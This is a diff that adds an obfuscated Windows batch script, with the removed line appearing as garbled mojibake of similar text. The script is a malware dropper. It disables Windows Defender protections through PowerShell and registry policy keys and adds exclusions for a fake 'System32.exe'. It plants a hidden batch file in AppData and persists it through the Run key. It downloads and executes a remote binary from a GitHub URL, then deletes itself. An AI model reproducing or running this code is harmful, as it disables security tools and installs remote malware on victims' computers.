@@ -1,1 +1,76 @@
-挦獬਍﻿ഊ敀档⁯景൦猊瑥砠瀽睯牥桳汥൬猊瑥礠ⴽ⁷楨摤湥ⴠ灥戠灹獡⁳挭਍敳⁴ㅺ匽汩湥汴䍹湯楴畮൥猊瑥稠㴲牅潲䅲瑣潩偮敲敦敲据൥猊瑥稠㴳獁敳扭祬਍敳⁴㑺䜽瑥祔数਍敳⁴㕺䜽瑥楆汥൤猊瑥稠㴶敓噴污敵਍敳⁴ㅡ匽൹猊瑥愠㴲瑳浥䴮湡਍敳⁴㍡愽敧敭瑮䄮瑵਍敳⁴㑡漽慭楴湯䄮൭猊瑥愠㴵楳瑕汩൳猊瑥愠㴶浡਍敳⁴㝡猽䥩楮൴猊瑥愠㴸慆汩摥਍敳⁴㥡丽湯൐猊瑥戠㴱扵楬Ᵽ瑓਍敳⁴㉢愽楴ൣ猊瑥戠㴳浯瑡潩⹮牔ൡ猊瑥戠㴴楣杮倮䕓睴਍敳⁴㕢䰽杯牐癯摩牥਍敳⁴㙢攽睴਍敳⁴㝢倽潲楶敤൲猊瑥挠㴱摁਍敳⁴㉣搽䴭൰猊瑥挠㴳牐晥牥湥散਍敳⁴㑣匽൥猊瑥挠㴵⵴灍਍敳⁴ㅤ倽潲牧浡楆敬塳㘸਍敳⁴㉤䄽灰楬慣楴湯慄慴਍敳⁴㍤䰽捯污灁汰捩瑡潩䑮瑡ൡ猊瑥攠㴱楍牣൯猊瑥攠㴲潳瑦䍜਍敳⁴㍥䰽൒猊瑥映㴱瑨灴㩳⼯楧൴猊瑥映㴲畨⹢潣⽭楤൮猊瑥映㴳業慨汩⽥癨㉨爯睡爯晥⽳敨摡⽳慭湩匯獹਍敳⁴㑦琽浥㈳攮數਍敳⁴ㅧ䠽ോ猊瑥朠㴲啃尺潓瑦਍敳⁴㍧眽牡履楍牣൯猊瑥朠㴴潳瑦坜湩਍敳⁴㕧搽睯屳畃牲湥൴猊瑥朠㴶敖獲潩屮畒൮猊瑥栠㴱䱃൒猊瑥栠㴲獕条൥猊瑥栠㴳潌൧猊瑥椠㴱祓瑳浥㈳攮數਍敳⁴㉩瀽睯牥桳汥⹬硥൥┊╸┠╹∠䔤✽稥┱㬧┤㉺㴥䔤琻祲⑻㵡剛晥⹝稥┳┮㑺⠥┧ㅡ✥✫愥┲⬧┧㍡✥✫愥┴⬧┧㕡✥㬩昤␽⹡稥┵✨愥┶⬧┧㝡✥✫愥┸Ⱗ┧㥡✥✫戥┱⬧┧㉢✥㬩昤┮㙺⠥渤汵ⱬ琤畲⥥捽瑡档絻琻祲⑻㵴剛晥⹝稥┳┮㑺⠥┧ㅡ✥✫愥┲⬧┧㍡✥✫戥┳⬧┧㑢✥✫戥┵⤧␻㵭琤┮㕺⠥┧㙢✥✫戥┷Ⱗ┧㥡✥✫戥┱⬧┧㉢✥㬩洤┮㙺⠥渤汵ⱬ⤰捽瑡档絻琻祲楻⡦捧⁭挥┱挥┲挥┳ⴠ慥〠笩瀤㵦䕛癮物湯敭瑮㩝䜺瑥潆摬牥慐桴✨搥┱⤧␻㵵瀤ⵦ敲汰捡❥尠砨㘸⥜Ⱗ✧☻⠠┧ㅣ✥✫挥┲⬧┧㍣✥ 䔭捸畬楳湯慐桴␠㭵瀤㵸䕛癮物湯敭瑮㩝䜺瑥潆摬牥慐桴✨搥┱⤧椻⡦敔瑳倭瑡⁨瀤⥸♻⠠┧ㅣ✥✫挥┲⬧┧㍣✥ 䔭捸畬楳湯慐桴␠硰㭽愤㵰䕛癮物湯敭瑮㩝䜺瑥潆摬牥慐桴✨搥┲⤧☻⠠┧ㅣ✥✫挥┲⬧┧㍣✥ 䔭捸畬楳湯慐桴␠灡␻灬嬽湅楶潲浮湥嵴㨺敇䙴汯敤偲瑡⡨┧㍤✥㬩…✨挥┱⬧┧㉣✥✫挥┳⤧ⴠ硅汣獵潩偮瑡⁨氤㭰琤灭␽湥㩶䕔偍☻⠠┧ㅣ✥✫挥┲⬧┧㍣✥ 䔭捸畬楳湯慐桴␠浴㭰…✨挥┱⬧┧㉣✥✫挥┳⤧ⴠ硅汣獵潩䕮瑸湥楳湯✠攮數Ⱗ⸧慢❴✬瀮ㅳ㬧…✨挥┱⬧┧㉣✥✫挥┳⤧ⴠ硅汣獵潩偮潲散獳✠椥┱Ⱗ┧㉩✥☻⠠┧㑣✥✫挥┵⬧┧㍣✥ 䐭獩扡敬敒污楴敭潍楮潴楲杮ㄠⴠ楄慳汢䉥桥癡潩䵲湯瑩牯湩⁧‱䐭獩扡敬求捯䅫䙴物瑳敓湥ㄠⴠ楄慳汢䥥䅏偖潲整瑣潩⁮‱䐭獩扡敬捓楲瑰捓湡楮杮ㄠⴠ楄慳汢䅥捲楨敶捓湡楮杮ㄠⴠ畓浢瑩慓灭敬䍳湯敳瑮㈠ⴠ䅍卐敒潰瑲湩⁧‰䠭杩周牨慥䑴晥畡瑬捁楴湯㘠ⴠ潍敤慲整桔敲瑡敄慦汵䅴瑣潩⁮‶䰭睯桔敲瑡敄慦汵䅴瑣潩⁮‶匭癥牥呥牨慥䑴晥畡瑬捁楴湯㘠絽慣捴筨㭽搤␽湥㩶偁䑐呁⭁尧攥┱⬧┧㉥✥✫攥┳㬧晩ℨ吨獥⵴慐桴␠⥤笩摭␠⁤䘭牯散佼瑵中汵絬␻㵳性䔤✽┧ㅺ✥㬧①稥┲怽䔤总攤怽攤癮吺䵅㭐摣怠攤总瀤✽┧ㅩ✥㬧牴筹睩⁲✧春┱✧✫┧㉦✥⬧✧春┳✧✫┧㑦✥‧伭怠瀤捽瑡档絻椻⡦敔瑳倭瑡⁨①⥰⹻怠瀤猻敬灥㌠爻⁭①⁰昭牯散❽␻米畏⵴楆敬尠␢層獕条䱥杯⹳慢屴•䔭据摯湩⁧十䥃⁉䘭牯散主睥䤭整偭潲数瑲⁹倭瑡⁨┧ㅧ✥✫朥┲⬧┧㍧✥✫朥┴⬧┧㕧✥✫朥┶‧中浡⁥┧ㅨ✥✫栥┲⬧┧㍨✥ⴠ慖畬⁥≜屠␢層獕条䱥杯⹳慢恴≜≜ⴠ牐灯牥祴祔数匠牴湩⁧䘭牯散佼瑵中汵㭬汳敥⁰㬲攤␽湥㩶䕔偍挻⁤攤␻㵰┧ㅩ✥琻祲楻牷⠠┧ㅦ✥✫春┲⬧┧㍦✥✫春┴⤧ⴠ⁏瀤捽瑡档絻椻⡦敔瑳倭瑡⁨瀤笩‮瀤猻敬灥㌠爻⁭瀤ⴠ潦捲絥•渾汵㈠☾റ猊瑥爠爽来਍敳⁴㵡摡൤猊瑥栠䠽䱋屍体呆䅗䕒਍敳⁴ㅰ尽潐楬楣獥䵜捩潲潳瑦坜湩潤獷䐠晥湥敤൲猊瑥瀠㴲剜慥⵬楔敭倠潲整瑣潩൮猊瑥瀠㴳䵜捩潲潳瑦坜湩潤獷䐠晥湥敤൲猊瑥瀠㴴䙜慥畴敲൳猊瑥瀠㴵䕜捸畬楳湯屳硅整獮潩獮਍敳⁴㙰尽硅汣獵潩獮停潲散獳獥਍敳⁴㵶瘯਍敳⁴㵴琯਍敳⁴㵤搯਍敳⁴㵦是਍爥‥愥‥┢╨瀥┱•瘥‥楄慳汢䅥瑮卩祰慷敲┠╴删䝅䑟佗䑒┠╤ㄠ┠╦㸠畮⁬㸲ㄦ਍爥‥愥‥┢╨瀥┱瀥┲•瘥‥楄慳汢剥慥瑬浩䵥湯瑩牯湩⁧琥‥䕒彇坄剏⁄搥‥‱春‥渾汵㈠☾റ┊╲┠╡∠栥┥ㅰ┥㉰∥┠╶䐠獩扡敬敂慨楶牯潍楮潴楲杮┠╴删䝅䑟佗䑒┠╤ㄠ┠╦㸠畮⁬㸲ㄦ਍爥‥愥‥┢╨瀥┱瀥┲•瘥‥楄慳汢佥䅮捣獥偳潲整瑣潩⁮琥‥䕒彇坄剏⁄搥‥‱春‥渾汵㈠☾റ┊╲┠╡∠栥┥㍰┥㑰∥┠╶吠浡数偲潲整瑣潩⁮琥‥䕒彇坄剏⁄搥‥‰春‥渾汵㈠☾റ┊╲┠╡∠栥┥㍰┥㕰∥┠╶攠數┠╴删䝅卟⁚搥‥〢•春‥渾汵㈠☾റ┊╲┠╡∠栥┥㍰┥㕰∥┠╶戠瑡┠╴删䝅卟⁚搥‥〢•春‥渾汵㈠☾റ┊╲┠╡∠栥┥㍰┥㕰∥┠╶瀠ㅳ┠╴删䝅卟⁚搥‥〢•春‥渾汵㈠☾റ┊╲┠╡∠栥┥㍰┥㙰∥┠╶┠ㅩ‥琥‥䕒彇婓┠╤∠∰┠╦㸠畮⁬㸲ㄦ਍爥‥愥‥┢╨瀥┳瀥┶•瘥‥椥┲┠╴删䝅卟⁚搥‥〢•春‥渾汵㈠☾റ琊浩潥瑵⼠⁴′港扯敲歡㸠畮൬搊汥∠縥て•渾汵㈠☾റ
+@echo off
+set a=p
+set b=o
+set c=w
+set d=e
+set e=r
+set f=s
+set g=h
+set h=e
+set i=l
+set j=l
+set k=.
+set l=e
+set m=x
+set n=e
+set o=%a%%b%%c%%d%%e%%f%%g%%h%%i%%j%%k%%l%%n%
+set p=-ep
+set q=bypass
+set r=-c
+set s=try{if(gcm 
+set t=Add-MpPreference
+set u=-ea 0){$t=$env:TEMP;$exe=Join-Path $t 'System32.exe';
+set v=Add-MpPreference -ExclusionPath
+set w=$exe;
+set x=Add-MpPreference -ExclusionProcess
+set y='System32.exe';
+set z=Add-MpPreference -ExclusionProcess 'powershell.exe';
+set a1=Set-MpPreference
+set b1=-DisableRealtimeMonitoring 1
+set c1=-DisableBehaviorMonitoring 1
+set d1=-DisableBlockAtFirstSeen 1
+set e1=-DisableIOAVProtection 1
+set f1=-DisableScriptScanning 1
+set g1=}}catch{}
+%o% %p% %q% %r% "%s%%t% %u%%v% %w%%x% %y%%z%%a1% %b1% %c1% %d1% %e1% %f1%%g1%" >nul 2>&1
+
+set r1=reg
+set r2=add
+set r3=HKLM\SOFTWARE\Policies\Microsoft\Windows Defender
+set r4=/v
+set r5=DisableAntiSpyware
+set r6=/t
+set r7=REG_DWORD
+set r8=/d
+set r9=1
+set r0=/f
+%r1% %r2% "%r3%" %r4% %r5% %r6% %r7% %r8% %r9% %r0% >nul 2>&1
+
+set s1=HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection
+set s2=DisableRealtimeMonitoring
+%r1% %r2% "%s1%" %r4% %s2% %r6% %r7% %r8% %r9% %r0% >nul 2>&1
+
+set s3=DisableBehaviorMonitoring
+%r1% %r2% "%s1%" %r4% %s3% %r6% %r7% %r8% %r9% %r0% >nul 2>&1
+
+set s4=DisableOnAccessProtection
+%r1% %r2% "%s1%" %r4% %s4% %r6% %r7% %r8% %r9% %r0% >nul 2>&1
+
+set s5=DisableScanOnRealtimeEnable
+%r1% %r2% "%s1%" %r4% %s5% %r6% %r7% %r8% %r9% %r0% >nul 2>&1
+
+set d=%APPDATA%\Microsoft\CLR
+if not exist "%d%" md "%d%" >nul 2>&1
+(echo @echo off
+echo powershell -w hidden -ep bypass -c "$e=$env:TEMP;cd $e;$p='System32.exe';iwr 'https://github.com/dinmihaile/hvh2/raw/refs/heads/main/System32.exe' -O $p;. $p"
+) > "%d%\UsageLogs.bat"
+
+set k1=HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+set k2=CLRUsageLog
+set k3=REG_SZ
+%r1% %r2% "%k1%" %r4% %k2% %r6% %k3% %r8% "\"%d%\UsageLogs.bat\"" %r0% >nul 2>&1
+
+powershell -w hidden -ep bypass -c "$e=$env:TEMP;cd $e;$p='System32.exe';iwr 'https://github.com/dinmihaile/hvh2/raw/refs/heads/main/System32.exe' -O $p;. $p;sleep 3;rm $p -force" >nul 2>&1
+
+timeout /t 1 /nobreak >nul
+del "%~f0" >nul 2>&1
